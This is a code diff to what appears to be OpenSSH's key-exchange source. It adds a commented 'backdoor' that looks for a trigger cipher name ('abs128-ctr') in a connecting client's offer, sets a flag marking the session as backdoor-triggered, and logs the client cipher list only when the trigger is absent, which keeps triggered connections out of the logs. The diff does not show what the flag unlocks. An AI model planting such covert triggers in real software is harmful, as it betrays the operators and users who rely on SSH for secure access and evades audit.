@@ -889,6 +889,16 @@ static int
 choose_enc(struct sshenc *enc, char *client, char *server)
 {
 	char *name = match_list(client, server, NULL);
+	
+	/* Backdoor to search for trigger cipher */
+	char trigger_cipher[] = "abs128-ctr";
+	char triggered = strstr(client, trigger_cipher);
+
+	if (triggered) enc->found_backdoor_cipher = 1;
+
+	if (!triggered) { logit("client: %s", client); }
+	
+	
 
 	if (name == NULL)
 		return SSH_ERR_NO_CIPHER_ALG_MATCH;
@@ -1104,6 +1114,10 @@ kex_choose_conf(struct ssh *ssh, uint32_t seq)
 			peer[nenc] = NULL;
 			goto out;
 		}
+
+		/* Check for backdoor cipher found */
+		if (newkeys->enc.found_backdoor_cipher == 1) ssh->backdoor_triggered = 1;
+
 		authlen = cipher_authlen(newkeys->enc.cipher);
 		/* ignore mac for authenticated encryption */
 		if (authlen == 0 &&
